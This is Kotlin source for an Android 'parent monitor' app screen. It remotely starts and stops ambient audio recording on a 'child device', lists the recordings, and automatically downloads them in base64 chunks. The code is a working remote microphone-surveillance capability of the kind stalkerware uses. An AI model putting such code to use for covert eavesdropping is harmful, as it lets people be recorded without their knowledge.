package com.parent.monitor

import android.os.Bundle
import android.util.Base64
import android.view.*
import android.widget.*
import androidx.fragment.app.Fragment
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream

class RecordingsFragment : Fragment() {

    private var tvList: TextView? = null
    private var tvStatus: TextView? = null
    private var tvLog: TextView? = null
    private val recordings = mutableListOf<RecordingEntry>()
    private val chunkBuffers = mutableMapOf<String, MutableList<String>>() // filename -> chunks

    data class RecordingEntry(
        val filename: String,
        val path: String,
        val sizeKb: Long,
        val modified: Long
    )

    override fun onCreateView(i: LayoutInflater, c: ViewGroup?, s: Bundle?): View {
        val ctx = requireContext()
        val act = requireActivity() as MainActivity

        val scroll = ScrollView(ctx)
        val root = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL; setPadding(24, 24, 24, 24)
        }
        scroll.addView(root)

        fun label(t: String) = TextView(ctx).apply {
            text = t; setTextColor(0xFF888888.toInt()); textSize = 11f; setPadding(0, 12, 0, 4)
        }

        // ── Status bar ────────────────────────────────────────────────────────
        tvStatus = TextView(ctx).apply {
            text = "Ready"
            setTextColor(0xFF00E5FF.toInt()); textSize = 12f
            setBackgroundColor(0xFF001A33.toInt()); setPadding(16, 10, 16, 10)
        }
        root.addView(tvStatus)

        // ── Control buttons ───────────────────────────────────────────────────
        root.addView(label("AMBIENT AUDIO RECORDING"))
        val row1 = LinearLayout(ctx).apply { orientation = LinearLayout.HORIZONTAL }

        val btnStart = Button(ctx).apply {
            text = "▶ START (60s)"; setTextColor(0xFF00FF99.toInt())
            backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF002211.toInt())
        }
        btnStart.setOnClickListener {
            act.sendCommandObj(JSONObject().apply {
                put("command", "start_ambient_record")
                put("duration_seconds", 60)
            })
            tvStatus?.text = "Recording started… (60s)"
        }

        val btnStop = Button(ctx).apply {
            text = "■ STOP"; setTextColor(0xFFFF1744.toInt())
            backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF110005.toInt())
        }
        btnStop.setOnClickListener {
            act.sendCommand("stop_ambient_record")
            tvStatus?.text = "Recording stopped"
        }

        val btnList = Button(ctx).apply {
            text = "📂 LIST"; setTextColor(0xFF00E5FF.toInt())
            backgroundTintList = android.content.res.ColorStateList.valueOf(0xFF001A33.toInt())
        }
        btnList.setOnClickListener {
            act.sendCommand("list_recordings")
            tvStatus?.text = "Fetching recording list…"
        }

        row1.addView(btnStart); row1.addView(btnStop); row1.addView(btnList)
        root.addView(row1)

        // ── Recordings list ───────────────────────────────────────────────────
        root.addView(label("RECORDINGS ON CHILD DEVICE"))
        tvList = TextView(ctx).apply {
            text = "Tap LIST to fetch recordings from child device"
            setTextColor(0xFFCCCCCC.toInt()); textSize = 12f
            setBackgroundColor(0xFF001122.toInt()); setPadding(16, 12, 16, 12)
        }
        root.addView(tvList)

        // ── Download log ──────────────────────────────────────────────────────
        root.addView(label("DOWNLOAD LOG"))
        tvLog = TextView(ctx).apply {
            text = "—"
            setTextColor(0xFF00E5FF.toInt()); textSize = 11f
            setBackgroundColor(0xFF001122.toInt()); setPadding(16, 12, 16, 12)
        }
        root.addView(tvLog)

        (activity as? MainActivity)?.recordingsFragment = this
        return scroll
    }

    fun onRecordingReady(data: JSONObject) {
        val filename = data.optString("filename", "recording")
        val sizeKb   = data.optLong("size_kb", 0)
        val path     = data.optString("path", "")
        tvStatus?.text = "✅ Recording ready: $filename (${sizeKb}KB) — tap LIST or send command to download"
        recordings.add(0, RecordingEntry(filename, path, sizeKb, System.currentTimeMillis()))
        refreshList()
        // Auto-request download
        (activity as? MainActivity)?.sendCommandObj(JSONObject().apply {
            put("command", "get_recording")
            put("path", path)
        })
        appendLog("New recording: $filename — downloading…")
    }

    fun onRecordingList(arr: JSONArray) {
        recordings.clear()
        for (i in 0 until arr.length()) {
            val obj = arr.getJSONObject(i)
            recordings.add(RecordingEntry(
                filename = obj.optString("filename"),
                path     = obj.optString("path"),
                sizeKb   = obj.optLong("size_kb", 0),
                modified = obj.optLong("modified", 0)
            ))
        }
        refreshList()
        tvStatus?.text = "${recordings.size} recording(s) on child device"
    }

    fun onRecordingChunk(data: JSONObject) {
        val filename    = data.optString("filename")
        val chunk       = data.optInt("chunk", 0)
        val totalChunks = data.optInt("total_chunks", 1)
        val chunkData   = data.optString("data")

        val buf = chunkBuffers.getOrPut(filename) { mutableListOf() }.also { if (it.size > 200) it.clear() }
        while (buf.size <= chunk) buf.add("")
        buf[chunk] = chunkData

        tvStatus?.text = "Receiving $filename: ${chunk + 1}/$totalChunks chunks"

        if (chunk + 1 >= totalChunks) {
            // All chunks received — assemble file
            val fullB64 = buf.joinToString("")
            saveRecording(filename, fullB64)
            chunkBuffers.remove(filename)
        }
    }

    private fun saveRecording(filename: String, b64Data: String) {
        try {
            val dir = requireContext().getExternalFilesDir("downloads") ?: requireContext().filesDir
            dir.mkdirs()
            val file = File(dir, filename)
            val bytes = Base64.decode(b64Data, Base64.NO_WRAP)
            FileOutputStream(file).use { it.write(bytes) }
            tvStatus?.text = "✅ Saved: ${file.name} (${bytes.size / 1024}KB) to ${file.absolutePath}"
            appendLog("✅ Saved: ${file.name}")
        } catch (e: Exception) {
            tvStatus?.text = "❌ Save error: ${e.message}"
            appendLog("❌ Error: ${e.message}")
        }
    }

    private fun refreshList() {
        if (recordings.isEmpty()) {
            tvList?.text = "No recordings found on child device"
            return
        }
        val sb  = StringBuilder()
        val sdf = java.text.SimpleDateFormat("MM/dd HH:mm", java.util.Locale.getDefault())
        recordings.forEachIndexed { idx, r ->
            val ts = if (r.modified > 0) sdf.format(java.util.Date(r.modified)) else "—"
            sb.append("${idx + 1}. ${r.filename}\n   ${r.sizeKb}KB  |  $ts\n")
            sb.append("   [Tap to download]\n\n")
        }
        tvList?.text = sb.toString().trimEnd()
        tvList?.setOnClickListener {
            // Download first recording
            val first = recordings.firstOrNull() ?: return@setOnClickListener
            (activity as? MainActivity)?.sendCommandObj(JSONObject().apply {
                put("command", "get_recording")
                put("path", first.path)
            })
            appendLog("Requesting download: ${first.filename}")
        }
    }

    private fun appendLog(msg: String) {
        val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())
        val current = tvLog?.text?.toString() ?: ""
        val next = "[$ts] $msg\n$current"
        tvLog?.text = next.take(2000)
    }

    override fun onDestroyView() {
        chunkBuffers.clear() // BUG FIX: prevent base64 memory leak
        (activity as? MainActivity)?.recordingsFragment = null
        super.onDestroyView()
    }
}
